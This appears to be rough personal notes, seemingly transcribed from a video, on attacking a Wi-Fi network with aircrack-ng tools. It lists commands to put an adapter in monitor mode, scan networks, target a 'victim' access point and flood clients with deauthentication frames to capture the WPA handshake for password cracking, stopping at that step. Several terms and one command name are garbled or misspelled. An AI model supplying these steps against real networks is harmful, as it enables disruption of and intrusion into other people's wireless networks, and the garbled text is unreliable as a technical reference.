Attack with crack password network

1.my network adapter into monitor mode by doing airon NG WN
appy command:
1.1 sudo airmon-ng wlan0 start
type an iwconfig just to make sure it is up and running and monitor.
sudo airmon-ng check kill (check and kill those process)
2. Now it's time to start the monitoring with one command arrow dump
2.1 sudo airodump-ng wlan0 -abg (dash abg to monitor all types of wireless channels)
3. if you want to go deeper and research more. Using the same command as earlier.
3.1 sudo airdump-ng -bssid <mac address victim> -c 2 wlan0(wirelss interface)
But the hacker can abuse that by sending his own DO message pretending to be
the wifi router to the clients. And what are the going to do?
They're going listen. They're like, oh, I'm just going to disconnect and
then reconnect. So if the airplay and G command, the nube does that,
You can either target one individual person that scanned and recon or the
entire network and all clients get authenicated all at once
you capture a four-war handshake when they try to reconnect.
3.2 sudo aireplay-ng -0 0 -a <mac victim> wlan0
